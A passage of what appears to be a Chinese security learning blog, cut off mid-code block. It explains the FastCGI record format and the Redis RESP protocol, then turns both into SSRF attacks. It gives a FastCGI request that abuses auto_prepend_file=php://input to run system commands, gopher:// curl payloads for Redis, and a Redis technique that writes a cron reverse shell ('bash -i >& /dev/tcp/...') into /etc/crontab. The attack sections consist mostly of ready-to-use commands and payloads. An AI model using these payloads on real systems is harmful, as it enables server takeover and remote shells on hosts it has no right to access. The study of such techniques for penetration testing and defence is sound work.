RSNl71FktK7Z6W3t1ds2ix9PLLL9s9uiZNmlRz8l0/gpufqZliKU6wJIkltXz16tXmmmuuMRMmTDC9e/c2N9xwgznllFO6/K56rk7fvn2Nu4b+PmPmzJoo586ZYzdUjhZfLL3+xhvm+1dfXdNmiCXEUiO/s5wbAhCAQEsRcCK5pRpVcGO22WYb079//4Kv2j6XI3FI/WyZJwxvxx13NPfdd19QI8osliQyZs2atZmn5bRTT+3iuYmCaJZYcu09/vjjuwiULGIprr/qn/MsSSzpfE5U6f+uxAk1ibHzzj/fPPPMM0HjZYcddjBXX3XVZkIXsYRYChpAVIIABCAAAQhAgMQh9RwDI0aMCPaGuwQPur7C8BSOl1bKLJaUTOHdNWvMB5s22SQVv7r7bvOLX/zCXHrJJWbw4MGJXW+WWIoTJhdfdJE56qijYsPw1IE8niXX8TQh5AusKCznWQoJ2dOxiCXEUtq9hs8hAAEIQAACEPAIVCWrZqONnmV7AyeWdtppJ7veRP8q2YP+TSpxYknHXjxpkjn/vPPMfvvtZzRx/uH8+eaKmTNNv379bHi2Ph9/7rnWo/Hwww+bedddZ5YvX25Fyr+edZbZf//9zbp166znZ+999jErV6wwPXv2NMOHD+8ShvfSSy+ZKVOmWE/Q0KFDzdKlS821115rli1fbg466CDzbxMmmIEDBxoXvnfqaaeZW265xZxx+umd3hmtE/rVr35lfvr//p+ZPGmSbVOt0iyxFF2v5Dw9EkvOYyTx5AuULGLpjDPOMFMvv9x6ieK8a0lrlpzHa8iQIZ3XVlvnzptn10E5b1XcuirHGbGEWGr0vZDzQwACEIAABNqKAOuWum/OffbZx+gntDixJIE0d+5c88gjj9hDFZYnwRQnms7853+2n/tF+y7NmzfPbN+3rxn57W9b78akyZPN2DFjrBDRRHrBjTeaqVOnmqeWLjXf/8EPzITx482gQYPMgw8+aG5YsMBMnTLF7LHHHlYEPLFkiRk/frw5dOhQ89Zbb3WKJe3LM33GDPPNb3zDHHvsseaVV14xl112mRk1erQ5cPBgc//995tFixfbv/151SpzwcSJdoP5737nO2aXXXax4ktF2x/MvOIKo/C2E44/3oaI1drz50f//u/m9ddfD8Waqd5nP/tZ8y9nnrnZMU6Q6IOJEyeaPn36mBtvuskcOWyYUWibhIhE0s/+8z/NH197zYqU3/zmN13WHImxhFCtBA8SNrLPffffn5gMwm+cL6qUUELCVO3QOcaOG2dF12GHHWZ/1/Uldv3QPsTSxzRJHZ7pq0JlCEAAAhCAQLUJaO3bY489Zr0QlOwEtGZOWTuzlOg+SxJM8vo40RR3rrvuvHMzsaR6ixcvtoJI3qTtt9/ezJkzx/Tt18+Kp+uvv9702Wor808nnWRmX3mlGbTvvsZ5wJzQ6tWrlxk5cqSZPXu2Xf83ZswYm4HOeYjOOussc9OPf2yOGT7cCiV9dscdd5jlL75ozj3nHBvWpTF0+eWXm5NPPtm24bvnnWcuuvBCIw+IX1Tv/ffft6Lshz/8oTl99OjOc8b1+bivf71hYmnIwQebH/3oR5tdVv3+P3Pm2H5eMnnyZskafK+NhMrtt99uRZW8c1kTPPgerCRvUlpmPJ3jhRdesOLMibc4kYRYQixluUdRFwIQgAAEIAABj4DLsqjU9JRwAlk9Su7MtTalVWidiv7VhN1tRCsPTtymtG+/84659NJLrSDac889zYUXXmj6Dxhgw+KumDXLpqbefffdbXIAeZz8jGqaiD/66KM2g5sm+n54l0SDRM+bb75pjjnmGDPxgguscFCJpsru7NdFF1mvVUgWPXlU7rzzTiuyttt221joTz75pNliyy279NulEncs8v5fXqJPDxiw2XXdGiD3gbx8LoV4aIIHX6wkJXHQ+aNiKSkjXjTkT8f665z0uVKHy8by2NVav0QYHmF44Xc4akIAAhCAAAQg0IWAn2FRWxFQuhJwqenlgVGYWd5SSywlnTMpwYNEgzw/b69ebfbaay+jNWhr3nvPfG3ECHP3PfeY7112mU08MWv27FTPUlQsTZs2zYwePdr87Oc/N1858kgbPqfJtkTW0qeesmFs+r8rElMSV1Gx5BI8+KLooYcesmGAbq1NXL+btWbJiRHtW6S2nzNunA0ZDBVL2kPJCc24frk04Hk8Sy7sziV90FoyCWsJpLgQwuj1EUuIpbz3LY6DAAQgAAEIQAAChRCop1hSg5ctW2YmX3KJXf+j8DcJkYUPPGC+dOihNqxOE2T9LW3NUlQsOdGz3XbbmSlTp5rhRx9tw+ZeffVVuz7plFNPNYcMGWKUuEETdom1OLGkz1RfE3qFLL7xxhs2OYQSRSjZgS+4fAM0UyypHfKgae2WW7uUJpZcam9/fVGIZ2nrbbaxYbC33npr7PiT50geOwmwrx51VJd063HZ8PQ3CT1Sh8d/nVmzVMhtjotAAAIQgAAEIACBfATqLZbkEZSwUdEmss8//7wZP2GCmTljhjn88MPt3yVo0rLhJYkleVVWrVrVRTA9/8ILZv78+ebxxx+365TkydLaJ3kk48LwXli2zPzH//2/5qFFi2z9k046yfyvf/zHztC+OJLNEksuxE1hiypKmpC0KawTVT+5+WYTFy6XJpZ0bh3nSjSELm3NUtrnUa54lvAs5btrcRQEIAABCEAAAhAoiEC9xVJBzS78Ms0QS1qrpSQOSu7grz1KWqcV3QMpaQNeH548dPJWaUNaZbDTOjJf9ETPERVq/udJm88mGQuxhFgq/IvMBSEAAQhAAAIQgEAWAoilMFrNEEthLStvLcQSYqm8o5eWQwACEIAABCBQCQKIpTAz9+7TJ6xijloKS9ywfn2OI8t9CGIJsVTuEUzrIQABCEAAAhBoewJ5xJIm9prgV6k0Uiwpy50yDFatdPTsmZhQoyosSPBQFUvTTwhAAAIQgAAESkkgj1jauHGj2bRxYyn7m6fRRXhAktKx52lvWY5pZGhjWRgglspiKdoJAQhAAAIQgEAlCeQRS1XzhPTs1cumQm9kqZoA1Qa+EktVL4ilqo8A+g8BCEAAAhCAQEsTyCOW1KGqTO4lkiSWGl0kQBXeqH+rUIoQoGXgiFgqg5VoIwQgAAEIQAAClSWQVyxpUr9p06a2DscrSii5wVcVwcRapY9vN4ilyt566TgEIAABCEAAAmUgkFcs+RN8rV/SRN/9lKHfcW1UaJjKlj16GP2utUpFFzFU8owPP/igM4lGmb1Njqn+3WLLLU1HR0fRSFv6eoilljYPjYMABCAAAQhAoOoEuiuWqs6P/kOgOwQQS92hx7EQgAAEIAABCECgwQQQSw0GzOkhUIMAYonhAQEIQAACEIAABFqYAGKphY1D09qeAGKp7U1MByEAAQhAAAIQKDMBxFKZrUfby04AsVR2C9J+CEAAAhCAAATamgBiqa3NS+danABiqcUNRPMgAAEIQAACEKg2AcRSte1P75tLALHUXP5cHQIQgAAEIAABCNQkgFhigECgeQQQS81jz5UhAAEIQAACEIBAKoHuiiW3Oa0upL2B2rXY/YK22MJoo1r9NKO0I2u3/1Iz9rRqhg2j10QstYIVaAMEIAABCEAAAhBIINAdsbRp0yazccOGyrHVBL9nr15249qiSruzFkttBly1TWsRS0V9g7gOBCAAAQhAAAIQyEEgr1jauHGj2bRxY44rtschRQqmKrHu0dFRKcGEWGqP+wG9gAAEIAABCECgTQnkFUvr1q5tUyLh3VLoWEfPnuEH5KxZNdby2jUr1DGniXIfhljKjY4DIQABCEAAAhCAQOMJ5BFL7R4SFkpd3qVevXuHVs9Vr4qsq+RdQizl+lpwEAQgAAEIQAACECiGQB6xpHVKmsRTjF271EgvSBVZi6e4VqEglqpgZfoIAQhAAAIQgEBpCTixtGDBAjN06NCgfqxft84oMxvF2DC8RmZyqyLrIjx2rTJ2EUutYgnaAQEIQAACEIAABGIIzJ071+gHsZRveDQ6ZKyWWHr55ZfNf/3iF2bc2LGmT58+nR247rrrzGGHHWYOPPDAzr8tWbLEjB03rvP/++67rzniiCPM9ddfH9vxuXPmmN1339389Kc/NaeffnqX8+sAnW/RokXm7LPPTgW3evXqzvPccMMNZuDAgea4446reVxvrz+pFyhxBcRSiY1H0yEAAQhAAAIQaH8CDz/8sBk9erQZO3as/QkpRXs7JAqmT59uJk2aZHbbbbeQJhZWp5liKUmwxIklB8T/7K677jI77bSTFVX+734ddw2JL19sxQG++KKLYkWQE0unnHKKef/99838+fPNkCFDagomxFJhQ5gLQQACEIAABCAAAQgkEXBi6ZBDDjE33nhjECjE0seYmimWJGrivDRZxNKMmTNjbS7PkvNM3XjTTebIYcO6CNVaQu0nN98cNI5UKUlgIZaCEVIRAhCAAAQgAAEIQKBRBF577TXrWdK/oaF4iKXmi6W1a9eaWbNmmf++997Oxpx26qk2LC6LWErzLLmTx13PH5M77LCDufqqq2I9f34Ynh8uWGtMI5Ya9Y3nvBCAAAQgAAEIQAACmQg88sgjZtSoUTYkS+FuaYke4sSSxNbFkyaZ8887z+y33352TcsP5883V8ycafr162dWrFhhPx9/7rlG62Xk0Zp33XVm+fLlZvDgweZfzzrL7L///mbdunVWBOy9zz5m5YoVpmfPnmb48OFdwvBeeuklM2XKFCsM1NalS5eaa6+91ixbvtwcdNBB5t8mTLAeFxe+d+ppp5lbbrnFnHH66V3W8WSClFC5WZ6l6Hol39MjsSTvjhNPftNDw/AOPvhgc/fdd1sxNvzoo83EiRO7rFuqtWZJIX2PPvpo5zESS+edf74ZO2ZMJ3/VUUlau4RYqsfo5BwQgAAEIAABCEAAAnUhoPVAt956qxVMJ5xwgv13xx13jBVOcWJJqcTnzZtntu/b14z89reNJsiTJk+2E2SJI02uF9x4o5k6dap5aulS8/0f/MBMGD/eDBo0yDz44IPmhgULzNQpU8wee+xhxdITS5aY8ePHm0OHDjVvvfVWp1hSWunpM2aYb37jG+bYY481r7zyirnsssvMqNGjzYGDB5v777/fLFq82P7tz6tWmQsmTjQDcjk/ZwAACq5JREFUBgww3/3Od8wuu+xixVc9S7PEkkTP4088Ya668krTt2/f2DVHSsBw3/33W4+PynfPO8+8+eab9ncJINnlmmuvjcXhwvCcKFMljY9axRdVsvftt99uBZMEsMSSyuRJk8y06dPNzjvtZAV60ho0xFI9RynnggAEIAABCEAAAhDoNoHbbrvNZsaTl6hWuevOO62QipbFixdbQSRv0vbbb2/mzJlj+vbrZ8WTsq712Wor808nnWRmX3mlGbTvvubEE0+0p3BCq1evXmbkyJFm9uzZpn///mbMmDFGaaSdh+iss84yN/34x+aY4cOtUNJnd9xxh1n+4ovm3HPOsSm833vvPXP55Zebk08+2bZBAuGiCy+0CQUaUeQ9U8KCRpU41hKil0+bZtO3nzNunBUc/roi33skdnPmzjWXTJ5sRVWoZ8ll0/M9WM8++2xsBry0zHguDE82lTjz10MlcUMsNWpEcV4IQAACEIAABCAAgdwEJJQUlqeiULk44fS9yy6LFUtvv/OOufTSS60g2nPPPc2FF15o+g8YYMPirpg1y4waOdKmo46GZOlaLnRrwoQJ5pprrumSLU0TducVOeaYY8zECy4wvXv3tm10IWfRDitxgLxWjc6i98s77zS//OUvc/NOOzCOtXj8euFCM/iAA6x4+drXvtYlhXjomiX/2n42PP/vUbGUlBEvLuTPt4/zOil1uDyF0bC+KAfEUtrI4HMIQAACEIAABCAAgZYkkJTgQZ4OeX7eXr3a7LXXXmbhwoVmzXvvma+NGGHuvuceo4n/1ltvbWbNnp3qWfJTS2vCPm3aNJuI4mc//7n5ypFHmuOPP956kjTJX/rUU+Zfzjyzy+awElMKOWu0WGpWGJ4GhpIuyGv03LPP2rTvLntdiFjae++9N0sQ4Q82J37yeJbcGqVnnnnGepGi+zXJZv9xww2JCSHUDsRSS371aRQEIAABCEAAAhCAQBqBWtnwli1bZiZfconR2iKFvz300ENm4QMPmC8deqgNq5PA0d/S1ixFxZITPdttt52ZMnWqXXOjULxXX33Vrk865dRTzSFDhpgPPvjAesMk1uLEkgTGho0bzbbbbGO7+e6aNaZnR4dNXqBj9f+t+vSxa5s2bNhg3l+71tZVf+JKM8WS2iPhcdvtt3euXXLenOimtK7tzhOn9UpuvZM7j8uM5/fTiaVdBw40K1eutIkj4orElTav1XqzP772Wpdzx2XDc4LqhOOPj03ygFhK+xbyOQQgAAEIQAACEIBASxKoJZa0ZkjCRkVJI55//nkzfsIEM3PGDHP44Yfbv0uUpGXDSxJLWp+zatWqLoLp+RdesOuGHn/8cbtOSZ4srX3S5D7qWfIztaktmty7a0Wztmktztx587pM/KMGaZZYcqm81XaFGypMUdn+krLLqS8KoYvLbJcmlnTurx51lJEAU9ifshD6JW3NUjRzX8igRiyFUKIOBCAAAQhAAAIQgEDLESh6n6WWA+A1qBliySV4GDd2bJdschKCcZvMxu2BlFTXdc0d8/TTT9s/SYRFRZG/Xixuc1n/GkmbzybZFrHUyqOetkEAAhCAAAQgAAEIJBJALH2MphliqQpDE7FUBSvTRwhAAAIQgAAEINCGBBBLHxu1o2fPLokl6m3uqrJGLNV7JHE+CEAAAhCAAAQgAIFCCGxYv96uO6IY02ixVEXW2j+r199Sw7f7GNviQ+WQpEAAAhCAAAQgAAEItA2BKk7gk4ynSb0m940qVWStjIkSoVUoiKUqWJk+QgACEIAABCBQKQKbNm0yGzdsqFSfkzrb6HCxKrJutLeulQYuYqmVrEFbIAABCEAAAhCAQB0IKHBIHo+qBxA1OrmDTFVF1o321tXhK1C3UyCW6oaSE0EAAhCAAAQgAIHWIaA1SxJMVS3apLZnr16FdL9KrMU0aQPgQmAXfBHEUsHAuRwEIAABCEAAAhAoioC8HgrHq1KyB61P2lJrajo6isJsr9PurMVV4XdVEkqyK2Kp0K8RF4MABCAAAQhAAALFE9BEXoKp3cPyNJFv9mS+HVkroUMjk2QU/40IvyJiKZwVNSEAAQhAAAIQgAAEIACBChFALFXI2HQVAhCAAAQgAAEIQAACEAgngFgKZ0VNCEAAAhCAAAQgAAEIQKBCBBBLFTI2XYUABCAAAQhAAAIQgAAEwgkglsJZURMCEIAABCAAAQhAAAIQqBABxFKFjE1XIQABCEAAAhCAAAQgAIFwAoilcFbUhAAEIAABCEAAAhCAAAQqRACxVCFj01UIQAACEIAABCAAAQhAIJwAYimcFTUhAAEIQAACEIAABCAAgQoRQCxVyNh0FQIQgAAEIAABCEAAAhAIJ4BYCmdFTQhAAAIQgAAEIAABCECgQgQQSxUyNl2FAAQgAAEIQAACEIAABMIJIJbCWVETAhCAAAQgAAEIQAACEKgQAcRShYxNVyEAAQhAAAIQgAAEIACBcAKIpXBW1IQABCAAAQhAAAIQgAAEKkQAsVQhY9NVCEAAAhCAAAQgAAEIQCCcAGIpnBU1IQABCEAAAhCAAAQgAIEKEUAsVcjYdBUCEIAABCAAAQhAAAIQCCeAWApnRU0IQAACEIAABCAAAQhAoEIEEEsVMjZdhQAEIAABCEAAAhCAAATCCSCWwllREwIQgAAEIAABCEAAAhCoEAHEUoWMTVchAAEIQAACEIAABCAAgXACiKVwVtSEAAQgAAEIQAACEIAABCpEALFUIWPTVQhAAAIQgAAEIAABCEAgnABiKZwVNSEAAQhAAAIQgAAEIACBChFALFXI2HQVAhCAAAQgAAEIQAACEAgngFgKZ0VNCEAAAhCAAAQgAAEIQKBCBBBLFTI2XYUABCAAAQhAAAIQgAAEwgkglsJZURMCEIAABCAAAQhAAAIQqBABxFKFjE1XIQABCEAAAhCAAAQgAIFwAoilcFbUhAAEIAABCEAAAhCAAAQqRACxVCFj01UIQAACEIAABCAAAQhAIJwAYimcFTUhAAEIQAACEIAABCAAgQoRQCxVyNh0FQIQgAAEIAABCEAAAhAIJ4BYCmdFTQhAAAIQgAAEIAABCECgQgQQSxUyNl2FAAQgAAEIQAACEIAABMIJIJbCWVETAhCAAAQgAAEIQAACEKgQAcRShYxNVyEAAQhAAAIQgAAEIACBcAKIpXBW1IQABCAAAQhAAAIQgAAEKkQAsVQhY9NVCEAAAhCAAAQgAAEIQCCcAGIpnBU1IQABCEAAAhCAAAQgAIEKEUAsVcjYdBUCEIAABCAAAQhAAAIQCCeAWApnRU0IQAACEIAABCAAAQhAoEIEEEsVMjZdhQAEIAABCEAAAhCAAATCCSCWwllREwIQgAAEIAABCEAAAhCoEAHEUoWMTVchAAEIQAACEIAABCAAgXACiKVwVtSEAAQgAAEIQAACEIAABCpEALFUIWPTVQhAAAIQgAAEIAABCEAgnABiKZwVNSEAAQhAAAIQgAAEIACBChFALFXI2HQVAhCAAAQgAAEIQAACEAgngFgKZ0VNCEAAAhCAAAQgAAEIQKBCBBBLFTI2XYUABCAAAQhAAAIQgAAEwgkglsJZURMCEIAABCAAAQhAAAIQqBABxFKFjE1XIQABCEAAAhCAAAQgAIFwAv8fBVWGhqoJXjAAAAAASUVORK5CYII=" alt="0"></p><p>FastCGI也是一种通信协议（类似<a href="https://so.csdn.net/so/search?q=HTTP%E5%8D%8F%E8%AE%AE&amp;spm=1001.2101.3001.7020">HTTP协议</a>），采用CS架构，web server 为客户端—发送请求，动态语言解析器 为服务端—处理请求</p><h6 id="FastCGI报文格式"><a href="#FastCGI报文格式" class="headerlink" title="FastCGI报文格式"></a><strong>FastCGI报文格式</strong></h6><p><strong>定义</strong></p><pre class="line-numbers language-language-http"><code class="language-language-http">typedef struct {          unsigned char version;  //版本          unsigned char type;      //类型          unsigned char requestIdB1;    //请求Id          unsigned char requestIdB0;                  unsigned char contentLengthB1;    //负载长度          unsigned char contentLengthB0;          unsigned char paddingLength;      //填充长度          unsigned char reserved;              //保留字节          unsigned char contentData[contentLength]; //负载数据          unsigned char paddingData[paddingLength]; //填充数据} FCGI_Record;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造出的执行**ls /**命令的FastCGI请求（ 调整过格式，不标准）</p><pre class="line-numbers language-language-http"><code class="language-language-http">CONTENT_LENGTH 34 # 内容长度CONTENT_TYPE application/text # 内容格式REMOTE_PORT 9985 # 请求端口SERVER_NAME localhost # server名GATEWAY_INTERFACE FastCGI/1.0 # APISERVER_SOFTWARE php/fcgiclient # server端 软件REMOTE_ADDR 127.0.0.1 # 请求ipSCRIPT_FILENAME /var/www/html/index.php # 脚本文件名SCRIPT_NAME /var/www/html/index.php # 脚本名PHP_VALUE auto_prepend_file = php://input REQUEST_METHOD POST # 请求方法SERVER_PORT 8 # server端口SERVER_PROTOCOL HTTP/1.1 # server 协议QUERYDOCUMENT_ROOT / # 请求文件根目录IN_VALUE allow_url_include = On # 设置 允许url包含SERVER_ADDR 127.0.0.1 # server ipREQUEST_URI /var/www/html/index.php # 请求资源 "<?php var_dump(system('ls /')); ?>" # 内容34<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ssrf-fastcgi"><a href="#ssrf-fastcgi" class="headerlink" title="ssrf + fastcgi"></a><strong>ssrf + fastcgi</strong></h1><ul><li>如果<strong>目标服务器使用的是php</strong>，并且<strong>存在ssrf</strong>，那么就可以构造FastCGI请求报文，直接让php解析服务进行解析，进而执行任意代码</li><li>之前构造出的执行 ls /的FastCGI请求中，关键部分</li></ul><pre class="line-numbers language-language-html"><code class="language-language-html">PHP_VALUE auto_prepend_file = php://input # 把auto_prepende_file的内容设置为 php://input    http post body# auto_prepende_file 会在解析指定php文件之前包含（可以理解为执行）# php://input的内容为POST请求的body IN_VALUE allow_url_include = On # 设置 允许url包含 使php://input被允许执行 REQUEST_URI /var/www/html/index.php # 请求资源 "<?php var_dump(system('ls /')); ?>" # 内容 post body<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>会在解析index.php之前，包含（执行）php://input的内容</li><li>这样，就可以使用ssrf+fastcgi执行任意代码了</li></ul><p>关键就是监听本地9000端口我们可以去打</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞攻击Redis</title>
      <link href="/2025/05/09/SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BBRedis/"/>
      <url>/2025/05/09/SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BBRedis/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis-简介"><a href="#Redis-简介" class="headerlink" title="Redis 简介"></a><strong>Redis 简介</strong></h1><p>Redis（Remote Dictionary Server）是一个开源的内存数据库，遵守 BSD 协议，它提供了一个高性能的键值（key-value）存储系统，常用于缓存、消息队列、会话存储等应用场景。</p><p>优点：性能高等</p><p>特点：</p><p>Redis 的所有操作都是原子性的，这意味着操作要么完全执行，要么完全不执行。这种特性对于确保数据的一致性和完整性非常重要。</p><p>单线程等</p><h1 id="Redis-命令"><a href="#Redis-命令" class="headerlink" title="Redis 命令"></a><strong>Redis 命令</strong></h1><h6 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a><strong>本地启动</strong></h6><p>进入src目录</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">cd redis-2.8.17/src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动redis </p><pre class="line-numbers language-language-shell"><code class="language-language-shell">./redis-server <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Redis 命令用于在 redis 服务上执行操作。</p><p>要在 redis 服务上执行命令需要一个 redis 客户端。Redis 客户端在我们之前下载的的 redis 的安装包中。</p><p>Redis 客户端启动</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">redis-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动 redis 服务器，打开终端并输入命令 <strong>redis-cli</strong>，该命令会连接本地的 redis 服务。</p><p>  <img src="/SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BBRedis/1746790234595.jpg" alt="1746790234595"></p><p>在以上实例中我们连接到本地的 redis 服务并执行 <strong>PING</strong> 命令，该命令用于检测 redis 服务是否启动。</p><h6 id="在远程服务上执行命令"><a href="#在远程服务上执行命令" class="headerlink" title="在远程服务上执行命令"></a><strong>在远程服务上执行命令</strong></h6><p>如果需要在远程 redis 服务上执行命令，同样我们使用的也是 <strong>redis-cli</strong> 命令。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><pre class="line-numbers language-language-shell"><code class="language-language-shell">$ redis-cli -h host -p port -a password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h3><p>以下实例演示了如何连接到主机为 127.0.0.1，端口为 6379 ，密码为 mypass 的 redis 服务上。</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">$redis-cli -h 127.0.0.1 -p 6379 -a "mypass"redis 127.0.0.1:6379>redis 127.0.0.1:6379> PINGPONG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a><strong>入侵</strong></h1><p>在开始讲攻击Redis之前，必须要理解Redis的客户端和服务端的通信方式，以及数据发送的格式，该目的的实现需要tcpdump的抓包功能。使用抓包软件来查看Redis客户端和Redis服务端的通信数据，找到语法结构后开始模拟客户端发送数据。</p><p>1.使用tcpdump来完成抓包，命令如下：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">tcpdump -i eth0 port 6379 -w redis.pcap参数说明如下：（更多tcpdump的教程，参考[Tcpdump教程](https://www.runoob.com/linux/linux-comm-tcpdump.html)）-i：指定网卡为eth0port：指定抓哪个端口的数据-w：将流量包保存为文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、使用Redis客户端登录Redis服务端，命令如下(默认无密码)：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">root@Kali-2018:~/tmp# redis-cli -h 192.168.228.130 -p 6379192.168.0.119:6379> get a(nil)192.168.0.119:6379><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>以上命令做了一个获取a对应的值是多少的操作，现在我们使用wireshark看一下抓到的包(使用追踪流-TCP流)：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">*2$3get$1a-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（这里没搞懂，但是wireshark使用方法参考工具的笔记）</p><p>不理解Redis的数据发送的数据包格式，是看不懂上面内容的，这里必须要讲这么几个内容：</p><p><strong>2.1、序列化协议</strong></p><p>客户端-服务端之间交互的是序列化后的协议数据。在Redis中，协议数据分为不同的类型，每种类型的数据<strong>均以CRLF（\r\n）结束</strong>，通过<strong>数据的首字符区分类型</strong>。</p><p><strong>2.2、inline command</strong></p><p>这类数据表示<strong>Redis命令，首字符为Redis命令的字符</strong>，格式为 str1 str2 str3 …。如：exists key1，命令和参数以空格分隔。</p><p><strong>2.3、simple string</strong>：<strong>首字符为’+’</strong>，后续字符为<strong>string</strong>的内容，且该string <strong>不能包含’\r’或者’\n’两个字符，最后以’\r\n’结束</strong>。如：’+OK\r\n’，表示”OK”，这个string数据。</p><p><strong>2.4、bulk string</strong>：bulk string <strong>首字符为’$’</strong>，紧跟着的是string数据的长度，<strong>‘\r\n’后面是内容本身</strong>（包含’\r’、’\n’等特殊字符），最后以’\r\n’结束。如：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">"$12\r\nhello\r\nworld\r\n"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面字节串描述了 “hello\r\nworld” 的内容（中间有个换行）。对于” “空串和null，通过’$’ 之后的数字进行区分：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">"$0\r\n\r\n" 表示空串；"$-1\r\n" 表示null。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>2.5、integer</strong>：以 <strong>‘:’ 开头</strong>，后面跟着整型内容，最后以’\r\n’结尾。如：”:13\r\n”，表示13的整数。</p><p><strong>2.6、array</strong>：以**’*‘开头**，<strong>紧跟着数组的长度</strong>，”\r\n” 之后是<strong>每个元素的序列化数据</strong>。如：”*2\r\n+abc\r\n:9\r\n” 表示一个长度为2的数组：[“abc”, 9]。数组长度为0或 -1分别表示空数组或 null。</p><p>数组的元素本身也可以是数组，多级数组是树状结构，采用先序遍历</p><p>的方式序列化。如：[[1, 2], [“abc”]]，序列化为：”<em>2\r\n</em>2\r\n:1\r\n:2\r\n*1\r\n+abc\r\n”。</p><p>3、经过上面内容的讲解，在回过头理解抓到的redis的包就很容易明白了。</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">*2 数组长度为2$3 bulk string，代表字符串长度为3，就是getget 普通字符$1 bulk string，代表字符串长度为1，就是aa 普通字符-1 返回内容，-1代表null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="Redis入侵，反弹shell"><a href="#Redis入侵，反弹shell" class="headerlink" title="Redis入侵，反弹shell"></a><strong>Redis入侵，反弹shell</strong></h6><p>如果要给redis发命令，按照他的序列化规则即可。现在有一个大胆的想法，如果我用gopher去执行redis的命令呢？为了实现我们的想法，我们在Redis中加一个key，名字为name，值为Margin。命令如下：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">set name Margin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，我们使用curl来发起gopher的请求，如下：</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">curl gopher://192.168.0.119:6379/_*2 $3 get $4 name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将其转化为url编码</p><pre class="line-numbers language-language-shell"><code class="language-language-shell">curl gopher://192.168.0.119:6379/_%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果如下</p><p><img src="D:\HexoBlog\source\SSRF漏洞攻击Redis\1746790443221.jpg" alt="1746790443221"></p><p>可以看到确实可以得到我们想要的东西</p><p>和Gopher协议在SSRF漏洞中的深入研究里面的方法差不多了</p><p>命令如下</p><pre class="line-numbers language-language-shell"><code class="language-language-shell"># 添加名为mars的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，开始和技术的\n必须要有一个，也就是前后各有一个，当然，多个可以，主要是为了避免crontab的语法错误。crontab知识可以参考：【https://www.runoob.com/w3cnote/linux-crontab-tasks.html】set mars "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n\n\n"# 设置备份的路径为/etcconfig set dir /etc/# 设置备份文件名为crontabconfig set dbfilename crontab# 开始备份save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述命令的含义总结为，利用Redis的备份功能，将</p><p><a href="https://zhida.zhihu.com/search?content_id=113329614&amp;content_type=Article&amp;match_order=2&amp;q=crontab&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDM2NTk2MDIsInEiOiJjcm9udGFiIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MTEzMzI5NjE0LCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjIsInpkX3Rva2VuIjpudWxsfQ.0EeIIidYMZq3N33PpqvWggNP1lfNZQp8fTCKHk0ht54&amp;zhida_source=entity">crontab</a>的定时任务备份到/etc/crontab中，起到执行命令的效果，因为Linux会监测/etc/crontab的内容，当我们将反弹shell的命令加入进去后，变会被执行</p><p>url编码</p><pre class="line-numbers language-language-http"><code 